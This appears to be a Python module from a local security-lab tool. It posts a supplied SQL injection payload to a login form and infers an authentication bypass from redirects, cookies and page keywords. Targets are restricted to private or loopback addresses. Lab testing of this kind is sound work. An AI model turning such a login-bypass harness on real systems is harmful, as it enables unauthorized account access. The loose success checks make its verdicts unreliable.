import requests
import time
import datetime
import socket
import ipaddress
import os
from urllib.parse import urlparse

def run_attack(target_url: str, payload: str) -> dict:
    """
    Executes a real HTTP-based SQL injection login bypass check against a local/private target URL.
    This validator determines vulnerability status based on actual server responses.
    """
    logs = []
    
    logs.append("[SYSTEM] Starting remote Login Bypass SQL injection scan")
    logs.append(f"[TARGET] {target_url}")
    logs.append(f"[TIME] Scan initiated at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logs.append("-" * 90)
    
    target_reachable = False
    http_request_completed = False
    authentication_bypassed = False
    final_url_path = ""
    
    # Helper to build the final response dict
    def make_result():
        # Append summary block
        summary = []
        summary.append("-" * 85)
        summary.append("\n[SYSTEM] Login Bypass scan completed.")
        summary.append("=" * 90)
        summary.append("LOGIN BYPASS SQL INJECTION SUMMARY")
        summary.append("=" * 90)
        summary.append(f"Target reachable          : {'Yes' if target_reachable else 'No'}")
        summary.append(f"HTTP request completed    : {'Yes' if http_request_completed else 'No'}")
        summary.append(f"Payloads tested           : {1 if target_reachable else 0}")
        summary.append(f"Successful bypasses       : {1 if authentication_bypassed else 0}")
        summary.append(f"Success rate              : {'100%' if authentication_bypassed else '0%'}")
        summary.append(f"Final URL                 : {final_url_path if final_url_path else '/'}")
        summary.append(f"Authentication bypassed   : {'Yes' if authentication_bypassed else 'No'}")
        summary.append("=" * 90)
        
        full_output = "\n".join(logs) + "\n" + "\n".join(summary)
        return {
            "output": full_output,
            "target_reachable": target_reachable,
            "http_request_completed": http_request_completed,
            "authentication_bypassed": authentication_bypassed,
            "final_url": final_url_path
        }

    # 1. Parse URL
    try:
        parsed_url = urlparse(target_url)
        scheme = parsed_url.scheme
        if not scheme:
            temp_url = target_url
            if not temp_url.startswith("http"):
                temp_url = "http://" + temp_url
            parsed_url = urlparse(temp_url)
            scheme = parsed_url.scheme or "http"
            
        hostname = parsed_url.hostname
        if not hostname:
            raise ValueError("Hostname could not be parsed.")
            
        port = parsed_url.port
        if not port:
            port = 443 if scheme == "https" else 80
            
        path = parsed_url.path or "/"
        query = parsed_url.query
    except Exception as e:
        logs.append("[ERROR] Invalid URL format.")
        logs.append("[RESULT] FAILED")
        logs.append("[SYSTEM] Scan terminated.")
        return make_result()
        
    # 2. Docker check & translation
    in_docker = os.path.exists('/.dockerenv') or (os.path.exists('/proc/self/cgroup') and any('docker' in line for line in open('/proc/self/cgroup', 'rt', errors='ignore')))
    
    actual_hostname = hostname
    if in_docker and hostname in ['localhost', '127.0.0.1', '::1']:
        actual_hostname = 'host.docker.internal'
        
    # 3. DNS Resolution
    logs.append(f"[DNS] Resolving hostname '{hostname}'...")
    time.sleep(0.4)
    
    resolved_ip = None
    try:
        resolved_ip = socket.gethostbyname(actual_hostname)
        logs.append(f"[DNS] Resolved hostname to server IP: {resolved_ip}")
    except socket.gaierror as e:
        logs.append(f"[ERROR] DNS resolution failed for hostname '{hostname}': {str(e)}")
        logs.append("[RESULT] FAILED")
        logs.append("[SYSTEM] Scan terminated.")
        return make_result()
        
    # 4. Local-lab safety check
    is_safe = False
    if actual_hostname == 'host.docker.internal':
        is_safe = True
    else:
        try:
            ip_obj = ipaddress.ip_address(resolved_ip)
            if ip_obj.is_loopback or ip_obj.is_private:
                is_safe = True
        except ValueError:
            pass
            
    if not is_safe:
        logs.append("[ERROR] Target IP address is not on a local or private network.")
        logs.append("[ERROR] Scanning of public internet targets is disabled for safety.")
        logs.append("[RESULT] FAILED")
        logs.append("[SYSTEM] Scan terminated.")
        return make_result()
        
    # 5. TCP Connection check
    logs.append(f"[CONNECT] Initializing TCP connection with {hostname}:{port}...")
    time.sleep(0.4)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect((resolved_ip, port))
        s.close()
        target_reachable = True
        logs.append("[CONNECT] Connection successfully established.")
    except Exception as e:
        logs.append("[CONNECT] Connection failed.")
        logs.append(f"[ERROR] Connection refused by the target server.")
        logs.append("[RESULT] FAILED")
        return make_result()
        
    # 6. Perform Real HTTP POST Request
    logs.append("-" * 90)
    logs.append("[PAYLOAD] Preparing login bypass attempt...")
    logs.append(f"[PAYLOAD] Testing: {payload}")
    time.sleep(0.4)
    
    logs.append("[HTTP] Dispatched POST request:")
    logs.append(f"POST {target_url}")
    
    actual_url = f"{scheme}://{actual_hostname}:{port}{path}"
    if query:
        actual_url += f"?{query}"
        
    session = requests.Session()
    # ONLY send email and password
    data = {
        "email": payload,
        "password": "test"
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-SPA-Request": "true"
    }
    
    start_time = time.time()
    try:
        response = session.post(actual_url, data=data, headers=headers, timeout=5.0, allow_redirects=True)
        http_request_completed = True
        elapsed_ms = int((time.time() - start_time) * 1000)
        
        status_code = response.status_code
        final_url = response.url
        
        final_url_display = final_url
        if in_docker and 'host.docker.internal' in final_url:
            final_url_display = final_url.replace('host.docker.internal', hostname)
            
        redirected = len(response.history) > 0
        cookies_received = len(session.cookies) > 0
        response_length = len(response.content)
        
        logs.append(f"[HTTP] Status {status_code} returned in {elapsed_ms} ms.")
        logs.append(f"[HTTP] Final URL:\n{final_url_display}")
        logs.append(f"[HTTP] Redirect detected: {'Yes' if redirected else 'No'}")
        logs.append(f"[HTTP] Session cookie received: {'Yes' if cookies_received else 'No'}")
        
        size_kb = response_length / 1024.0
        logs.append(f"[RESPONSE] Response body length: {size_kb:.1f} kB")
        
        response_text_lower = response.text.lower()
        orig_path = parsed_url.path or "/"
        final_parsed = urlparse(final_url)
        final_path = final_parsed.path or "/"
        final_url_path = final_path
        
        # Analyze response
        redirected_away = False
        if "login" in orig_path.lower() or "signin" in orig_path.lower():
            if "login" not in final_path.lower() and "signin" not in final_path.lower():
                redirected_away = True
                
        auth_paths = ["dashboard", "admin", "profile", "home", "account", "welcome"]
        path_indicates_auth = any(p in final_path.lower() for p in auth_paths)
        
        success_keywords = ["logout", "dashboard", "admin", "my account", "login successful", "welcome"]
        failure_keywords = ["invalid email", "invalid credentials", "login failed", "incorrect password", "wrong password"]
        
        has_success_keyword = any(kw in response_text_lower for kw in success_keywords)
        has_failure_keyword = any(kw in response_text_lower for kw in failure_keywords)
        
        success_reason = ""
        if status_code >= 400:
            authentication_bypassed = False
            success_reason = f"Server returned error status code: {status_code}."
        elif final_path.lower() == "/login" or final_path.lower() == "/signin":
            authentication_bypassed = False
            logs.append("[ANALYSIS] Target returned to the login page.")
            success_reason = "No authentication bypass indicators detected."
        else:
            if redirected_away or path_indicates_auth:
                authentication_bypassed = True
                success_reason = "Authentication bypass indicators were detected."
            elif cookies_received and not has_failure_keyword:
                authentication_bypassed = True
                success_reason = "Authentication bypass indicators were detected."
            elif has_success_keyword and not has_failure_keyword:
                authentication_bypassed = True
                success_reason = "Authentication bypass indicators were detected."
            else:
                authentication_bypassed = False
                success_reason = "No authentication bypass indicators detected."
                
        if authentication_bypassed:
            logs.append(f"[ANALYSIS] {success_reason}")
            logs.append("[RESULT] SUCCESS! Login Bypass achieved using SQL injection.")
        else:
            if not any("Target returned to the login page" in line for line in logs):
                logs.append("[ANALYSIS] No authentication bypass indicators detected.")
            logs.append("[RESULT] FAILED")
            
    except requests.exceptions.Timeout:
        logs.append("[ERROR] Request timed out (5s).")
        logs.append("[RESULT] FAILED")
    except requests.exceptions.SSLError as e:
        logs.append(f"[ERROR] SSL Error: {str(e)}")
        logs.append("[RESULT] FAILED")
    except requests.exceptions.RequestException as e:
        logs.append(f"[ERROR] HTTP request failed: {str(e)}")
        logs.append("[RESULT] FAILED")
        
    return make_result()